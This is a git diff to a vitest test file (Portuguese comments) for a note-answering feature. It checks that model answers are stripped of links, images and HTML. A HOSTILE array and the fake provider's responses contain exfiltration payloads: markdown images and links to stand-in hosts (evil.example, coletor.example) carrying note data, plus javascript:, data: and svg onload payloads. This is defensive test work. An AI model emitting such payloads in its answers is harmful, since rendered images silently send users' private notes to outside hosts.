@@ -3,6 +3,7 @@
 // delimitador. Tudo com o provedor FALSO, sobre cópias do cérebro de exemplo.
 import { writeFile } from 'node:fs/promises';
 import { join } from 'node:path';
+import { fileURLToPath } from 'node:url';
 import { afterAll, afterEach, describe, expect, it } from 'vitest';
 import type { GenerateRequest } from '../../src/ask/index.ts';
 import { ask, createFakeProvider, isPrivateNote, parseSentPassages, prepareAsk } from '../../src/ask/index.ts';
@@ -192,13 +193,78 @@ describe('M3: o segredo é procurado na nota inteira', { timeout: TEST_TIMEOUT_M
   });
 });
 
+/** Um renderizador de Markdown de verdade (micromark com GFM, que o site já instala), quando está no repositório. */
+async function markdownRenderer(): Promise<((text: string) => string) | null> {
+  const { readdirSync } = await import('node:fs');
+  const { pathToFileURL } = await import('node:url');
+  const store = join(fileURLToPath(new URL('../../../../node_modules/.pnpm', import.meta.url)));
+  let entries: string[];
+  try {
+    entries = readdirSync(store);
+  } catch {
+    return null;
+  }
+  const find = (prefix: string, name: string): string | null => {
+    const dir = entries.find((entry) => entry.startsWith(prefix));
+    return dir === undefined ? null : join(store, dir, 'node_modules', name, 'index.js');
+  };
+  const core = find('micromark@', 'micromark');
+  const gfmPath = find('micromark-extension-gfm@', 'micromark-extension-gfm');
+  if (core === null || gfmPath === null) return null;
+  const { micromark } = (await import(pathToFileURL(core).href)) as {
+    micromark: (value: string, options: object) => string;
+  };
+  const { gfm, gfmHtml } = (await import(pathToFileURL(gfmPath).href)) as {
+    gfm: () => object;
+    gfmHtml: () => object;
+  };
+  // o mais permissivo: HTML cru liberado e autolinks do GFM
+  return (text) => micromark(text, { allowDangerousHtml: true, extensions: [gfm()], htmlExtensions: [gfmHtml()] });
+}
+
+/** Casos da revisão (1ª e 2ª rodadas) e variações: nenhum pode virar link, imagem ou HTML. */
+const HOSTILE = [
+  'Resumo ![x](https://evil.example/c?d=O%20Atlas) e <img src=https://evil.example/i>',
+  'imagem com colchetes aninhados e URL sem esquema: ![a [b] c](//coletor.example/DADOS-DA-NOTA.png)',
+  'imagem simples sem esquema: ![a](//coletor.example/X.png)',
+  'link de referência: ![a][r] e depois\n\n[r]: //coletor.example/R.png',
+  '![a][r]\n\n[r]: coletor.example/R.png',
+  'autolink: <https://coletor.example/A> e <mailto:a@b.example>',
+  'entidade: &lt;img src=//coletor.example/E.png&gt;',
+  'wikilink/embed: ![[coletor.example/W.png]] e [[Nota|https://x]]',
+  'imagem com espaço no destino entre <>: ![a](<//coletor.example/B C.png>)',
+  'imagem com parênteses no destino: ![a](//coletor.example/p(1).png)',
+  'domínio sem esquema: coletor.example/?q=DADOS e www.coletor.example e coletor.com',
+  'link com quebra: [a\n](//coletor.example/Q.png)',
+  'HTML: <a href="//x.example">a</a> <iframe src=x></iframe> <svg onload=1>',
+  'escape do escape: \\![a](//coletor.example/Z.png) \\<img src=x>',
+  '[texto](javascript:alert(1)) [t](data:text/html,x) [t](vbscript:x)',
+  'pé de página[^1]\n\n[^1]: https://coletor.example/F',
+];
+
 describe('M5: a resposta do modelo não leva link, imagem nem HTML', { timeout: TEST_TIMEOUT_MS }, () => {
-  it('neutraliza imagem, link, endereço e HTML no texto e no "missing" (prova p7)', async () => {
-    expect(
-      neutralizeMarkup(
-        'Resumo ![x](https://evil.example/c?d=O%20Atlas) e <img src=https://evil.example/i> e [aqui](https://evil.example/m) www.evil.example/p',
-      ),
-    ).not.toMatch(/evil\.example|<img|\]\(|!\[/);
+  it('nenhum caso hostil sobra como colchete, sinal de menor/maior sem escape ou endereço (provas p7, q7)', () => {
+    for (const hostile of HOSTILE) {
+      const out = neutralizeMarkup(hostile);
+      expect(out, hostile).not.toMatch(/(^|[^\\])[[\]<>]/);
+      expect(out, hostile).not.toMatch(/coletor\.example|evil\.example|x\.example|javascript:|data:|vbscript:/i);
+    }
+  });
+
+  it('renderizado por um Markdown de verdade (GFM, HTML liberado), não sai <a>, <img> nem outra tag', async () => {
+    const render = await markdownRenderer();
+    if (render === null) return; // sem o renderizador no repositório: a bateria acima vale
+    for (const hostile of HOSTILE) {
+      const before = render(hostile);
+      const html = render(neutralizeMarkup(hostile));
+      // a prova de que o renderizador funciona: o caso cru produz link, imagem ou HTML (a entidade já é só texto; o embed é do Obsidian, não do GFM)
+      if (!/^(entidade|wikilink)/.test(hostile)) expect(before, hostile).toMatch(/<(a|img|iframe|svg|sup)\b|href=/);
+      expect(html, hostile).not.toMatch(/<(?!\/?p>)[a-z!/]/i);
+      expect(html, hostile).not.toMatch(/<[^>]*\b(href|src)=/i);
+    }
+  });
+
+  it('de ponta a ponta: texto e "missing" saem neutralizados (provas p7, q8)', async () => {
     const brain = await brainWith();
     const provider = createFakeProvider({
       responder: (request: GenerateRequest) => {
@@ -207,19 +273,19 @@ describe('M5: a resposta do modelo não leva link, imagem nem HTML', { timeout: 
           status: 'answered',
           claims: [
             {
-              text: 'Resumo ![x](https://evil.example/c?d=O%20Atlas%20usa%20SQS) e <img src=https://evil.example/i>',
+              text: 'Resposta ![logo [oficial] da empresa](//coletor.example/O_20Projeto.png) e <img src=https://evil.example/i>',
               sources: [sent?.label ?? 'S1'],
               quote: 'Projeto Atlas migrou de RabbitMQ para SQS',
             },
           ],
-          missing: 'Veja [aqui](https://evil.example/m?d=dados) ![](https://evil.example/p.png?q=segredo)',
+          missing: '![x [y] z](//coletor.example/m.png) Veja [aqui](https://evil.example/m?d=dados)',
         };
       },
     });
     const { output } = await ask(brain, { question: 'Atlas migrou para SQS?' }, { providers: [provider] });
     expect(output.status).toBe('answered');
-    expect(JSON.stringify(output)).not.toContain('evil.example');
-    expect(output.answer).not.toMatch(/<img|!\[|\]\(/);
+    expect(JSON.stringify(output)).not.toMatch(/coletor\.example|evil\.example/);
+    for (const text of [output.claims[0]?.text ?? '', output.missing ?? '']) expect(text).not.toMatch(/(^|[^\\])[[<]/);
   });
 });
 
